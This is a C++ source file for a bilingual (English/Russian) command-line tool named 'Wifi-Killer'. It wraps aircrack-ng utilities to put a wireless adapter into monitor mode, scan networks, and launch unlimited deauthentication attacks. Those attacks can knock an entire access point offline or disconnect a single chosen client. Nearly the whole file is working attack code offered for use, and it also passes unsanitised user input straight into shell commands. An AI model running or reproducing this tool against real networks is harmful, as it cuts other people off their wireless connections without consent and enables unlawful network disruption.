#include<iostream>
#include <stdlib.h>
#include<unistd.h>
using namespace std;
int wifi(string adapter){
	string bssid, ch, bssid2;
	int varr=0;
	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
	cout<<"\n1-Scan networks\n2-Kill AP\n3-Deauth attack\n4-Exit\nWK>";
	cin>>varr;
		if(varr==4){
			system("clear");
			cout<<"Exiting...\n";
			system(("airmon-ng stop " + adapter +"mon").c_str());
			system("service network-manager start");
			return 0;
		}else if(varr==1){
			system(("airodump-ng " + adapter + "mon").c_str());
			wifi(adapter);
		}else if(varr==2){
			system("clear");
			system(("airodump-ng " + adapter + "mon").c_str());
			cout<<"Enter BSSID to kill\nWK>";
			cin>>bssid;
			cout<<"Enter channel where work AP\nWK>";
			cin>>ch;
			system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
			system("clear");
			cout<<"Kill atack started\n";
			sleep(3);
			system(("aireplay-ng --deauth 0 -a " + bssid + " " + adapter + "mon").c_str());
			system("clear");
			wifi(adapter);
		}else if(varr==3){
			system(("airodump-ng " + adapter + "mon").c_str());
			cout<<"Enter BSSID to scan\nWK>";
			cin>>bssid;
			cout<<"Enter channel where work AP\nWK>";
			cin>>ch;
			system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
			cout<<"Enter the station\nWK>";
			cin>>bssid2;
			system(("aireplay-ng --deauth 0 -a " + bssid + " -c " + bssid2 + " " + adapter + "mon").c_str());
			system("clear");
			wifi(adapter);
		}else{
			cout<<"ERROR\n";
			sleep(3);
			system("clear");
			wifi(adapter);
		}
				}

int ruwifi(string adapter){
	string bssid, ch, bssid2;
	int varr=0;
	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
	cout<<"\n1-Сканировать сети\n2-Отключить точку доступа\n3-Отключить клиента\n4-Выход\nWK>";
	cin>>varr;
		if(varr==4){
			system("clear");
			cout<<"Выход...\n";
			system(("airmon-ng stop " + adapter +"mon").c_str());
			system("service network-manager start");
			return 0;
		}else if(varr==1){
			system(("airodump-ng " + adapter + "mon").c_str());
			ruwifi(adapter);
		}else if(varr==2){
			system("clear");
			system(("airodump-ng " + adapter + "mon").c_str());
			cout<<"Введите BSSID ТД\nWK>";
			cin>>bssid;
			cout<<"Введите канал на котором находится ТД\nWK>";
			cin>>ch;
			system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
			system("clear");
			cout<<"Атака начата\n";
			sleep(3);
			system(("aireplay-ng --deauth 0 -a " + bssid + " " + adapter + "mon").c_str());
			system("clear");
			ruwifi(adapter);
		}else if(varr==3){
			system(("airodump-ng " + adapter + "mon").c_str());
			cout<<"Введите BSSID ТД для сканирования\nWK>";
			cin>>bssid;
			cout<<"Введите канал на котором находится ТД\nWK>";
			cin>>ch;
			system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
			cout<<"Введите станцию\nWK>";
			cin>>bssid2;
			system(("aireplay-ng --deauth 0 -a " + bssid + " -c " + bssid2 + " " + adapter + "mon").c_str());
			system("clear");
			ruwifi(adapter);
		}else{
			cout<<"ERROR\n";
			sleep(3);
			system("clear");
			ruwifi(adapter);
		}
				}

int main(){
	int lang=0;
	char pack, progr;
	string adapter;
	system("clear");
	system("apt install aircrack-ng toilet -y");
	system("clear");
	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
	cout<<"Language?"<<endl;
	cout<<"1-English"<<endl;
	cout<<"2-Russian\nWK>";
	cin>>lang;
	if(lang==1){
		system("clear");
		system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
		cout<<"Enter into programm?(y/n)\nWK>";
		cin>>progr;
		if(progr=='y'){
			system("airmon-ng check kill");
			system("clear");
			system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
			system("iwconfig");
			cout<<"\nEnter name of adapter(wlan0, etc.)\nWK>";
			cin>>adapter;
			system(("airmon-ng start " + adapter).c_str());
			system("clear");
			wifi(adapter);
			return 0;
		}
		else if(progr=='n'){
			cout<<"Exiting...\n";
			return 0;
		}else{
			cout<<"ERROR\n";
			sleep(3);
			main();
		}
	}else if(lang==2){
				system("clear");
				system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
				cout<<"Ввойти в программу?(y/n)\nWK>";
				cin>>progr;
				if(progr=='y'){
					system("airmon-ng check kill");
					system("clear");
					system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
					system("iwconfig");
					cout<<"\nВведите имя адаптера(wlan0, и т.д.)\nWK>";
					cin>>adapter;
					system(("airmon-ng start " + adapter).c_str());
					system("clear");
					ruwifi(adapter);
					return 0;
				}
				else if(progr=='n'){
					cout<<"Выход...\n";
					return 0;
				}else{
					cout<<"ОШИБКА\n";
					sleep(3);
					main();
				}
	}else{
		cout<<"ERROR\n";
		sleep(3);
		main();
	}
}
